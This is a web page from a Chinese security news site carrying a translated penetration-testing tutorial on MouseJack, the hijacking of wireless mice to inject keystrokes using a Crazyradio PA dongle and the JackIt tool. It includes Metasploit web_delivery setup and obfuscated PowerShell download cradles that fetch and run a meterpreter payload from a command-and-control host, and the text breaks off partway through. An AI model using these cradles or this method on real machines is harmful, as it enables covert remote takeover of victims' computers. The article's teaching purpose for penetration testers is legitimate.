<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>

        <title>【技术分享】如何远程控制别人的无线鼠标：深度揭露鼠标劫持内幕 - 安全客 - 有思想的安全新媒体</title>
    
        <meta name="keywords" content="无线鼠标,鼠标劫持"/>
    
        <meta name="description" content="无线鼠标是一种被广泛使用的输入设备，受到了许多白领人士以及在拎着笔记本在外奔波的业务员们的青睐。但研究表明，无线鼠标存在安全隐患，恶意攻击者可通过低成本的无线攻击设备通过远程控制受害者的无线鼠标并进行一系列恶意操作"/>
        <meta property="wb:webmaster" content="224437c7be31d633"/>

    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
    (max-device-width:900px), only screen and (max-width:900px)" />
    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
    <script type="text/javascript" src="/js/iscroll.js"></script>
    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded() {
            myScroll = new IScroll('#wrapper',
                {
                    scrollX: true,
                    scrollY: false,
                    bounceEasing: 'circular',
                    eventPassthrough: true,
                    preventDefault: false,
                    bounceTime: 500
                }
            );
        }

        $(function () {

            //导航横向滚动


            function setNavWidth() {

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if (allWidth > 900) {
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if (myNavScroll) myNavScroll.destroy();
                } else {

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
                        if (!$(this).hasClass('mobile-hide')) {
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);

                    if (myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true
                    });

                }

            }

            setNavWidth();
            $(window).resize(function (event) {
                setNavWidth();
            });

        });

    </script>
</head>
<body onload="iscrollLoaded();">
<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
    <img src=""/>
</div>

<div id="is-mobile"></div>
<div class="container">
        <div class="mobile-header">
        <div class="header clearfix">
            <div class="header-wrapper clearfix">
                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
                                <form id="search" class="search-box" action="/search/index" method="GET">
                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                    <input class="icon" type="submit" value="">
                    <input type="hidden" name="type" value=""/>
                </form>
                <div class="bug">
                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
                    <ul class="typelist">
                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    </ul>
                </div>
                                <div class="logNreg mobile-hide">
                    <div class="unlog">
                        <i></i>
                        <a href="log.html" class="log">登录</a>
                        <span>|</span>
                        <a href="reg.html" class="reg">注册</a>
                    </div>
                    <div class="loged">
                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                        <div class="user-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
                                                               target="_blank"><i></i><span>账号设置</span></a></li>
                                <li class="alert-setting"><a href="/keywords/index"
                                                             target="_blank"><i></i><span>告警设置</span></a></li>
                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
                                </li>
                                <li class="my-exit"><a
                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
                                </li>
                            </ul>
                        </div>

                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                        <div class="message-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting" style="display:none;"><a href="/myres/index"
                                                                                     target="_blank"><i></i><span>回复我的</span></a>
                                </li>
                                <li class="my-bug"><a href="/myvul/index"
                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                                </li>-->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style type="text/css">
            .nav {
                overflow: hidden;
            }

            .nav .scroll {
                width: auto;
            }
        </style>
        <div id="wrapper">
            <div id="scroller" class="nav">
                <div class="scroll">
                    <ul class="nav-list">
                        <li ><a class="link-nav"
                                                                                 href="/index/index">首页</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/vul/index">漏洞</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/introduce/list">招聘</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                        </li>
                        <li class="cur">
                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/course/index">学院</a></li>
                        </ul>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/activity/index">活动</a></li>
                        <li class="mobile-hide "><a class="link-nav"
                                                                                                   href="/ctf/index">CTF训练营</a>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/interref/list">安全内参</a></li>
                        <li ><a class="link-nav" href="/app/index">APP</a></li>

                        <!--<li ><a href="/course/index">学院</a></li>-->
                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <div class="mobile-content">
        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
<style>
    p .syntaxhighlighter {
        width: 80%;
    }
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>

<div class="content clearfix">
    <div class="main">
        <div class="article">
            <div id="article_box">
                <h2>【技术分享】如何远程控制别人的无线鼠标：深度揭露鼠标劫持内幕</h2>
                <div class="article-msg">
                    <span class="time">2017-09-07 10:45:57</span>
                    
                                        <span class="read">阅读：8452次</span>
                    <span><a style="display: none;" class="good" href="javascript:;"
                             data-target="/learning/good" data-value="g_4366"
                             data-type="learning">点赞(0)</a></span>
                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
                             data-pk="4366" data-type="learning">收藏</a></span>
                                        <span><a style="margin-left: 4px;" class="fav" href="https://toshellandback.com/2017/08/16/mousejack/"
                             target="_blank">来源： toshellandback.com</a></span>
                    
                    
                    <div style="margin-top:10px; ">
                        <a href="/member/contribute?uid=2937531371" style="color:#848e99;">
                            <img src="http://p1.qhmsg.com/dm/150_150_100/t00df551a583a87f4e9.jpg" data-is-avatar="true"
                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
                        </a>

                    </div>
                    <span class="orig">作者：<a href="/member/contribute?uid=2937531371" style="color:#848e99;">紫曦归来</a></span>
                                    </div>
                <hr size="1">
                <div class="article-msg">
                    <p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
                </div>
                <p><p style="text-align: center;"><img src="http://p5.qhimg.com/t01ac1cbc290d74fe22.jpg" title="t0111f4cbf7f199c2ef.jpg" alt="http://p1.qhimg.com/t0111f4cbf7f199c2ef.jpg"/></p><p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; white-space: normal; background: white; text-indent: 2em;"><span style="color: rgb(0, 112, 192); font-weight: 900; font-size: 18px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">译者：</span><a href="http://bobao.360.cn/member/contribute?uid=2937531371" target="_blank" style="color: rgb(0, 112, 192); line-height: 28px; font-weight: 900; font-size: 18px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">紫曦归来</a></p><p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; white-space: normal; background: white; text-indent: 2em;"><span style="color: rgb(0, 112, 192); font-weight: 900; font-size: 18px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">预估稿费：260RMB</span></p><p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; white-space: normal; background: white; text-indent: 2em;"><span style="color: rgb(0, 112, 192); font-weight: 900; font-size: 18px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿</span></p><p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; white-space: normal; background: white; text-indent: 2em;"><span style="color: rgb(0, 112, 192); font-weight: 900; font-size: 18px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">简介</span></strong></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">无线鼠标是一种被广泛使用</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">的输入设备，受到了许多白领人士以及在拎着笔记本在外奔波的业务员们的青睐。但研究表明，无线鼠标存在安全隐患，恶意攻击者可通过低成本的无线攻击设备通过远程控制受害者的无线鼠标并进行，这也就是俗</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">一系列恶意操作</span><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">称的“</span><strong style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">鼠标劫持</strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">”（mouseJack）。接下来，让小编带大家看看黑客究竟是如何实施鼠标劫持的。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在内部交互活动（internal engagements）中，对本地网络的名称解析请求（poisoning name resolution requests）进行投毒污染，是一种获得初始域名密码的有效方法之一。虽然这一方法对多数客户端奏效（可以在非常短的时间内获得被攻击用户的域名管理权）。但是如果链路本地多播名称解析（<strong>LLMNR</strong>）和NETBIOS协议名称服务（<strong>NTB-NS</strong>）被安全地配置或者禁用时又该如何？还有一个问题那就是，目前已经证明Responder是一款强大并且简单易用的内网渗透神器，那么还有没有其他类似的工具或者方法呢？本研究将就此进行深入探讨。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在进行物理检测时，负责渗透测试的人员会运用多种攻击方法，其中就会使用到无线外设（wireless peripherals），这种技术也被称之为“鼠标劫持”（<strong>mousejacking</strong>）。2016年初一家美国物联网安全创业公司Bastille发布了一份披露无线鼠标漏洞的调查报告称, 多产商生产的无线鼠标和无线键盘存在安全漏洞。此后，鼠标劫持开始进入大众视野。恶意攻击者可以通过低成本的无线攻击设备远程控制受害者的无线鼠标并进行一系列恶意操作。事实上，鼠标劫持并不是不可能完成的任务，大多数无线鼠标（和少数键盘）在设备和其配对的USB加密狗之间没有使用加密通信，即使使用了加密通信也很难逃过攻击者的魔掌。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">你的鼠标存在漏洞吗？</span></strong></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">也许你会好奇哪些设备存在安全漏洞。Bastille网站上已经列出了一长串存在漏洞的设备名单。我本人对微软和罗技产品比较熟悉，下列微软的鼠标存在安全漏洞（事实上，存在漏洞的鼠标产品不只下面几个）：</span></p><p style="text-indent: 2em;"><a href="https://www.amazon.com/gp/product/B00DUV01RS/ref=as_li_tl?ie=UTF8&camp=1789&creative=9325&creativeASIN=B00DUV01RS&linkCode=as2&tag=jrenard-20&linkId=4977184ed817063a716e0a44f7f01758" target="_self"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Sculpt人体工学鼠标 （Sculpt Ergonomic Mouse）</span></a></p><p style="text-indent: 2em;"><a href="https://www.amazon.com/gp/product/B003PBZHPE/ref=as_li_tl?ie=UTF8&camp=1789&creative=9325&creativeASIN=B003PBZHPE&linkCode=as2&tag=jrenard-20&linkId=b7cb195a680409ed3b4819c459eda46b" target="_self"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">微软无线鼠标4000（Wireless Mobile Mouse 4000）</span></a></p><p style="text-indent: 2em;"><a href="https://www.amazon.com/gp/product/B008XB0JNG/ref=as_li_tl?ie=UTF8&camp=1789&creative=9325&creativeASIN=B008XB0JNG&linkCode=as2&tag=jrenard-20&linkId=3e22ed1de7fd1477c04743e312a452c2" target="_self"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">微软无线鼠标5000（Wireless Mouse 5000）</span></a></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">使用Unifying“优联”无线技术的罗技鼠标易遭受mousejacking攻击。但大多罗技公司生产的无线鼠标均采用了Unifying“优联”无线技术。使用这一技术的鼠标蓝牙适配器极易进行识别：</span></p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp;<img src="http://p3.qhimg.com/t014393621f3c268ab9.png" title="t014005451c4e22ccc2.png" alt="http://p6.qhimg.com/t014005451c4e22ccc2.png"/></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">进行Mousejack攻击前，首先要购买SeeedStudio的Crazyradio PA USB的蓝牙适配器（加密狗）和天线。下图所示是一个2.4 GHz的远程无线发射器价值约30美元，部分无人机产品也使用这一型号的发射器。接下来，我们要将这个发射性进行改造，使其能够发起恶意攻击。这个新的固件将允许加密狗进行恶意运行，添加数据包嗅探（packet sniffing）和注入功能。一旦获得Crazyradio PA套件，我们就可以在这里找到使用新固件进行设置的说明。</span></p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp;<img src="http://p2.qhimg.com/t01f86bd25a4b885dc0.png" title="t0143c8ebe1ce8a7d23.png" alt="http://p2.qhimg.com/t0143c8ebe1ce8a7d23.png"/></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果可以使用更多的设备进行测试效果会更好。在我的个人实验室里，我使用的是罗技的m510无线鼠标和微软的无线移动鼠标4000进行测试。</span></p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp;&nbsp;<img src="http://p3.qhimg.com/t015b576cce5b750bd6.png" title="t0174ddfb9e2be22251.png" alt="http://p8.qhimg.com/t0174ddfb9e2be22251.png"/><img src="http://p0.qhimg.com/t0150901b5fd1ef5c6a.png" title="t0150901b5fd1ef5c6a.png" alt="http://p9.qhimg.com/t0150901b5fd1ef5c6a.png"/></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">首选的实施攻击的软件是JackIt，这是一个由phiksun和infamy编写的python脚本。本研究在利用Bastille公司2016发布的研究报告基础上，简化了设备识别和攻击传播。使用Kali或自定义地传播，获取了脚本：</span></p><pre class="brush:bash;toolbar:false">&nbsp;$&nbsp;git&nbsp;clone&nbsp;https://github.com/insecurityofthings/jackit.git&nbsp;/opt/</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">查看一遍README.md文件，并按照说明安装JackIt软件。安装完成后，须确保在启动工具之前插入Crazyradio PA蓝牙适配器。如果没有做到这一步，将会导致JackIt发生错误。我们开始运行JackIt。此时，JackIt将进入搜索模式，帮助你找寻无线输入设备：</span></p><pre class="brush:bash;toolbar:false">&nbsp;/opt/jackit/$&nbsp;./jackit.py</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">你需要花费一些时间来检查JackIt的输出。</span></p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp;<img src="http://p5.qhimg.com/t01aa81b6c548f7fd21.png" title="t01aa81b6c548f7fd21.png" alt="http://p3.qhimg.com/t01aa81b6c548f7fd21.png"/></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">当JackIt发现范围内的无线输入设备后，会根据初始显示顺序在密码（KEY）栏中创建一个新的行。当你要针对某一设备实施攻击时，你需要参考这些数据。在地址（ADDRESS）栏中显示的是无线设备的硬件MAC地址。这一栏中的内容可以帮助你确定之前有没有见过，或者攻击过这些无线设备（JackIt不会跟踪你以前定位的设备，因此在同时使用多台设备时，你需要自行跟踪这些设备）。在JackIt捕获到足够的数据包后，类型栏（TYPE）就会显示捕获到的设备的具体品牌。值得注意的一点是，在上面这张截屏上，第二个设备（KEY 2）未被正确的识别出来。</span></p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp;<img src="http://p9.qhimg.com/t016e423f6f395a3f91.png" title="t016e423f6f395a3f91.png" alt="http://p9.qhimg.com/t016e423f6f395a3f91.png"/></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">与无线通信相关的统计（COUNT）和可见（SEEN）栏在无线设备及其蓝牙适配器之间进行检测。统计（COUNT）栏用于统计使用Crazyradio PA软件获取到的无线设备及其蓝牙适配器之间通讯的次数；而可见（SEEN）栏显示的是设备最后一次通信距离现在的时间。没有被检测出的设备可能有以下两种原因，一是在检测时没有频繁使用，二是不在检测范围内。在第一种情况下，用户可能暂时没有使用电脑，从而导致电脑进入待机状态。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">频道（CHANNELS）显示的是无线设备及其蓝牙适配器之间进行通信的频道。数据包（PACKET）栏显示的是最后捕获的通信内容。这两栏我们可以暂时忽略。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">为了有效地实施攻击，JackIt软件需要了解发送给受害者的恶意鼠标操作（malicious keystrokes）。该软件所使用的是Duckyscript脚本语言，这同样也是Hak5 USB 橡皮鸭（Rubber Ducky）所使用的脚本语言。USB 橡皮鸭是一款按键注入工具。USB 橡皮鸭要求Duckyscript脚本语言在使用之前进行编码，但JackIt则无需这样，只需要在文本文件中发送一个“plaintext”命令即可。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">以下是我推荐使用Duckyscript脚本语言进行鼠标劫持的起始点。鉴于用户可以看到正在进行的鼠标劫持，因此我会尽可能尝试简化攻击过程，但也会尽量详细地展示这一过程。延时（DELAY）的时间比使用USB橡皮鸭的脚本语言要短得多，因为我们无需等待驱动程序安装。除了降低延时（DELAY）外，尽可能地缩短实际的攻击有效载荷对达到攻击效果也大有裨益。原因有两个方面：一是较少的击键次数意味着可以在最短的时间内将字符发送给受害者（每一次击键将会在被攻击者电脑上打出字，从而引起被攻击者的注意）；二是可以减少数据在传输过程中的损失问题（无线攻击可能不稳定，可能会出现丢失字符或出现错误字符的问题）。稍后我会深入探讨这一问题。</span></p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp;<img src="http://p0.qhimg.com/t013805484dd9a8e87e.png" title="t013805484dd9a8e87e.png" alt="http://p8.qhimg.com/t013805484dd9a8e87e.png"/></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">使用上面这个脚本，JackIt将打开Windows的“运行”（run）提示，临时暂停，并发送指定的恶意有效载荷，再暂停，然后再发出命令。为了能够比较清楚明了地展示出击键注入的速度以及用户对鼠标劫持的反应情况，我向受害者设备发送了一串字符（如下图所示）：</span></p><p style="text-align: center; text-indent: 0em;"></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">正如你所见，即便我加快了输入字符的速度，但仍然会在用户计算机上显示一个活动窗口。用户就会注意到这一攻击行动。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">注意：如果击键输入打开了一个有效的程序，例如<strong>powershell.exe</strong>，窗口将在输入结束后关闭。在这种情况下，运行提示窗口会自动弹出，并且在无法正确处理命令时突出显示文本。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">从鼠标到远程木马入侵</span></strong></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">下一步，漏洞利用——在大多数情况下，要实现这步，至少需要两台设备。一台是用于实施攻击的设备，这台设备一般须安装Crazyradio PA蓝牙设配器以及JackIt软件。这台设备的操作者需要接近攻击目标，以获取正在使用的无线输入设备的相关信息。这台攻击设备发送的有效载荷将使受害者的计算机与第二台设备相连。这台设备是指挥与控制（C2）服务器的虚拟主机。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">那么，问题来了，我们要使用哪种恶意有效载荷呢？PowerShell one-liners是一个不错的选择。Metasploit Framework有一个专门为PowerShell one-liners建立的模块（可进行<strong>exploit/multi/script/web_delivery</strong>等操作）。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">下图所示是Web_Delivery模块：</span></p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp;<img src="http://p7.qhimg.com/t01b31859dca62f6c20.png" title="t01b31859dca62f6c20.png" alt="http://p6.qhimg.com/t01b31859dca62f6c20.png"/></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">需要注意的一点是，默认的exploit目标值已经设置为 Python高级程序设计语言。使用PowerShell作为分发机制，我们就需要运行SET TARGET 2程序。这将确保使用PowerShell下载的渗透测试平台和恶意软件所生成的有效载荷能够奏效。作为C2服务器的第二台设备上须按照SRVHOST和LHOST。其中，SRVPORT将被设置成用于托管恶意有效载荷的端口，而LPORT则被设置成有效载荷处理程序的端口。一般情况下，我们建议你尽可能使用无状态的有效载荷（例如windows/meterpreter_reverse_https等），这将有助于你成功绕过攻击目标计算机自带的防毒软件。尝试使用Web Delivery模块将导致错误，这主要是由于有效载荷超出了窗口命令栏所规定的8192个字符命令限制（Cobalt Strike的有效载荷可通过压缩字符数绕过这种限制）。由于存在这种限制，我们可以使用分级有效载荷：<strong>windows/meterpreter/reverse_https</strong>。最后，我们需要将URIPATH设置成一些简短的/a字符，以避免Metasploit生成一个随机的多字符串。当所有程序都设置完毕，模块将如下图所示：</span></p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp;<img src="http://p6.qhimg.com/t011733adfdfb5c3eab.png" title="t011733adfdfb5c3eab.png" alt="http://p1.qhimg.com/t011733adfdfb5c3eab.png"/></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">让我们运行该模块生成单行PowerShell，展开攻击荷载handler：</span></p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp;<img src="http://p9.qhimg.com/t01853dc24663377dfd.png" title="t01853dc24663377dfd.png" alt="http://p1.qhimg.com/t01853dc24663377dfd.png"/></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如之前所述，使用此类攻击的优点是可以尽量缩短字符串的长度。 由Web Delivery模块生成的字符串比我喜欢使用的大多数鼠标劫持（mousejacking）字符串略长一点：</span></p><pre class="brush:ps;toolbar:false">powershell.exe&nbsp;-nop&nbsp;-w&nbsp;hidden&nbsp;-c&nbsp;$v=new-object&nbsp;net.webclient;$v.proxy=[Net.WebRequest]::GetSystemWebProxy();$v.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX&nbsp;$v.downloadstring(&#39;http://192.168.2.10/a&#39;);</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">并不像一个普通的PowerShell下载cradle，不是么？该模块会生成一个随机变量（在本示例中为$ v），并使用它帮助混淆cradle，从而绕过某些防御措施。此外，这些命令可以使cradle看起来像是使用了代理，这将有助于攻击载荷成功在互联网上放出（如果你的C&amp;C服务器服务器基于云服务，可能会起到帮助）。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们完全能够在缩短攻击载荷字符串的情况下，仍然使其具备功效，但我们必须权衡其中利弊。如果我们的C&amp;C服务器就存在于目标网络内部，可以删除与代理相关的命令，同时继续保留一些混淆代码以保护cradle完整性。再或者，如果我们真的需要最短的字符串，可以去掉所有的混淆代码，恢复其成为正常的下载cradle。所有的这些最终归结于，你是选择防止用户察觉，还是躲避对方主机的防护措施。以下是每种修改方法的示例：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:ps;toolbar:false">powershell.exe&nbsp;-nop&nbsp;-w&nbsp;hidden&nbsp;-c&nbsp;$v=new-object&nbsp;net.webclient;IEX&nbsp;$v.downloadstring(&#39;http://192.168.2.10/a&#39;);
